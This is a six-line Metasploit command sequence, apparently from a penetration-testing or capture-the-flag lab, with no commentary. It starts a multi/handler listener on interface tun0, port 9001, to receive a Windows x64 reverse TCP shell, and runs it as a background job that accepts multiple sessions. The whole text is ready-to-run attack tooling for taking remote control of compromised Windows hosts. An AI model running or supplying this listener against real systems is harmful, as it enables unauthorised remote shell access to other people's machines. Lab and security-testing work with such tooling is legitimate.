use exploit/multi/handler
set LHOST tun0
set LPORT 9001
set payload windows/x64/shell_reverse_tcp
set ExitOnSession false
exploit -j
